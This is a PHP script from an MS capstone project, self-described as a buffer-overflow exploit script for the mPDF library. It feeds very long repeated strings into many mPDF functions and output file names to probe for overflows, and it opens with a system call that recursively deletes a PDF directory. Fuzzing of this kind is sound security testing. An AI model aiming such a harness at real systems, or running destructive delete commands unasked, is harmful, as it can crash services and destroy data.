<!-- File: buffer.php -->
<!-- Assignment: MS Capstone -->
<!-- Lanuguage: PHP -->
<!-- Author: Sean Kells <spk3077@rit.edu> -->
<!-- Description: Exploit Script (Buffer Overflow) for mPDF -->
<?php
require_once __DIR__ . '/vendor/autoload.php';

// Wipe existing PDFs
system("rm -r /var/www/myapp/pdfs/*");

$MAX_COUNT = 10000;

set_error_handler("warning_handler", E_WARNING);


function warning_handler($errno, $errstr) { 
    if (str_contains( $errstr, 'File name too long')) {
        echo nl2br("File name too long WARNING\n");
    }
    else {
        echo nl2br($errstr."\n");
    }
}

// createPDF function contains the standard process for producing PDFs for all tests
function createPDF() {
	$pdf = new \Mpdf\Mpdf(['tempDir' => __DIR__ . '/temp']);
	$pdf->SetCompression(false);
	$pdf->AddPage();
	return $pdf;
  }

// Creator
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->SetCreator(str_repeat("V", $i));
    $pdf->OutputFile('/var/www/myapp/pdfs/creator.pdf');
    $i++;
}

// Title
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->SetTitle(str_repeat("V", $i));
    $pdf->OutputFile('/var/www/myapp/pdfs/title.pdf');
    $i++;
}

// Author
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->SetAuthor(str_repeat("V", $i));
    $pdf->OutputFile('/var/www/myapp/pdfs/author.pdf');
    $i++;
}

// Subject
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->SetSubject(str_repeat("V", $i));
    $pdf->OutputFile('/var/www/myapp/pdfs/subject.pdf');
    $i++;
}

// Keywords
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->SetKeywords(str_repeat("V", $i));
    $pdf->OutputFile('/var/www/myapp/pdfs/keywords.pdf');
    $i++;
}

// Annotation
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
	$pdf->Annotation(
		str_repeat("V", $i),
		145, 24, str_repeat("V", $i), str_repeat("V", $i), str_repeat("V", $i),
		0.7, array(127, 127, 255)
	);
    $pdf->OutputFile('/var/www/myapp/pdfs/annotation.pdf');
    $i++;
}

// Image Links
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
	$pdf->Image("/var/www/myapp/images/xref.jpg", 0, 0, 210, 297, 'jpg', str_repeat("V", $i), true, false);
    $pdf->OutputFile('/var/www/myapp/pdfs/linkimage.pdf');
    $i++;
}

// AutosizeText
$pdf = createPDF();
$pdf->AutosizeText(str_repeat("V", $MAX_COUNT), 20.0, 'times', '', 72);
$pdf->OutputFile('/var/www/myapp/pdfs/autosize.pdf');

// MultiCell
$pdf = createPDF();
$pdf->MultiCell( 20.0, 20.0, str_repeat("V", $MAX_COUNT));
$pdf->OutputFile('/var/www/myapp/pdfs/multicell.pdf');

// writeHTML
$pdf = createPDF();
$pdf->WriteHTML(str_repeat("V", $MAX_COUNT));
$pdf->OutputFile('/var/www/myapp/pdfs/writehtml.pdf');

// writeCell
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->WriteCell(120, 120, str_repeat("V", $i));
    $pdf->OutputFile('/var/www/myapp/pdfs/writecell.pdf');
    $i++;
}

// writeText
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->WriteText(60, 60, str_repeat("V", $i));
    $pdf->OutputFile('/var/www/myapp/pdfs/writetext.pdf');
    $i++;
}

// Overwrite
$pdf = createPDF();
$pdf->SetCreator('ABC');
$pdf->SetTitle('ABC');
$pdf->SetAuthor('ABC');
$pdf->SetSubject('ABC');
$pdf->SetKeywords('ABC');
$pdf->Image("/var/www/myapp/images/xref.jpg", 0, 0, 210, 297, 'jpg', 'ABC', true, false);
$pdf->MultiCell( 20.0, 20.0, 'ABC');
$pdf->WriteHTML('ABC');
$pdf->WriteCell(120, 120, 'ABC');
$pdf->WriteText(60, 60, 'ABC');
$pdf->AutosizeText('ABC', 15.0, 'times', '', 72);
$pdf->Annotation(
    'ABC',
    145, 24, 'ABC', 'ABC', 'ABC',
    0.7, array(127, 127, 255)
);

$search = array('ABC');
$replacement = array(str_repeat("V", $MAX_COUNT));
$pdf->OutputFile('/var/www/myapp/pdfs/overwrite_1.pdf');
$pdf->OverWrite('/var/www/myapp/pdfs/overwrite_1.pdf', $search, $replacement, 'F', '/var/www/myapp/pdfs/overwrite_2.pdf');

// Output
try {
    $i = 1;
    while ($i < $MAX_COUNT) {
        $pdf = createPDF();
        $pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
        $pdf->OutputFile('/var/www/myapp/pdfs/output'.str_repeat("V", $i).'.pdf');
        $i++;
    }
} catch (Exception $e) {
    if (str_contains($e->getMessage(), 'Unable to create output file') && $e->getCode() == 0) {
        echo nl2br('Unable to create output file');
    }
    else {
        echo nl2br($e->getMessage()."\n");
    }
}

?>
<h1 style="text-align:center;">Buffer Overflow Testing Complete!</h1>
